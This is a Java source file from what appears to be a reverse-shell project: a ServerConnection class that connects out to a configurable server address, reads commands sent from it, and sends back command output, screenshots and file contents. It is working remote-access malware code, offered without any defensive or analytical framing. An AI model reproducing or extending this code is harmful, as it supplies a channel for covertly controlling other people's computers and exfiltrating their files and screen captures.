package obs1d1anc1ph3r.reverseshell;

import java.io.*;
import java.net.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ServerConnection {

    private final String serverIp;
    private final int serverPort;
    private Socket socket;
    private DataInputStream textIn;
    private DataOutputStream dataOut;
    private static final Logger logger = Logger.getLogger(ServerConnection.class.getName());
    //private static final int SOCKET_TIMEOUT = 60000;
    //private static final int CONNECTION_TIMEOUT = 5000;

    public ServerConnection(String serverIp, int serverPort) {
        this.serverIp = serverIp;
        this.serverPort = serverPort;
    }

    public synchronized void connect() throws IOException {
        try {
            System.out.println("[-] Connecting to server...");
            socket = new Socket();
            socket.connect(new InetSocketAddress(serverIp, serverPort));
            //socket.setSoTimeout(SOCKET_TIMEOUT);
            System.out.println("[-*] Connected to server: " + serverIp + ":" + serverPort);
            textIn = new DataInputStream(socket.getInputStream());
            dataOut = new DataOutputStream(socket.getOutputStream());
            //} catch (SocketTimeoutException e) {
            //logger.log(Level.SEVERE, "Connection timed out: {0}", e.getMessage());
            //throw new IOException("Connection timed out", e);
        } catch (UnknownHostException e) {
            logger.log(Level.SEVERE, "Unknown host: {0}", e.getMessage());
            throw new IOException("Unknown host: " + e.getMessage(), e);
        } catch (IOException e) {
            logger.log(Level.SEVERE, "IO error occurred while connecting: {0}", e.getMessage());
            throw e;
        }
    }

    public String readCommand() throws IOException {
        String command = textIn.readUTF();
        if (command == null) {
            throw new IOException("Server connection closed unexpectedly.");
        }
        return command;
    }

    public void sendResponse(String response) {
        try {
            if (dataOut != null) {
                dataOut.writeUTF(response);
                dataOut.flush();
            } else {
                logger.warning("Attempted to send response while output stream is closed.");
            }
        } catch (IOException ex) {
            logger.log(Level.SEVERE, "Failed to send response", ex);
        }
    }

    public void sendScreenShot(byte[] imageBytes) {
        try {
            if (imageBytes != null && imageBytes.length > 0) {
                sendResponse("screenshot");
                dataOut.writeInt(imageBytes.length);
                dataOut.write(imageBytes);
                dataOut.flush();
            } else {
                logger.warning("Empty screenshot data, nothing sent.");
                sendResponse("Error: Failed to capture screenshot.");
            }
        } catch (IOException ex) {
            logger.log(Level.SEVERE, "Failed to send screenshot", ex);
        }
    }

    public void sendFile(byte[] fileBytes) {
        try {
            if (fileBytes != null && fileBytes.length > 0) {
                dataOut.writeInt(fileBytes.length);
                dataOut.write(fileBytes);
                dataOut.flush();
            } else {
                sendResponse("Error: File is empty.");
            }
        } catch (IOException ex) {
            logger.log(Level.SEVERE, "Failed to send file", ex);
        }
    }

    public synchronized void cleanup() {
        try {
            if (textIn != null) {
                textIn.close();
            }
            if (dataOut != null) {
                dataOut.close();
            }
            if (socket != null) {
                socket.close();
            }
            System.out.println("[*] Resources cleaned up successfully.");
            System.exit(0);
        } catch (IOException e) {
            logger.log(Level.SEVERE, "Error closing resources: " + e.getMessage(), e);
        }
    }
}
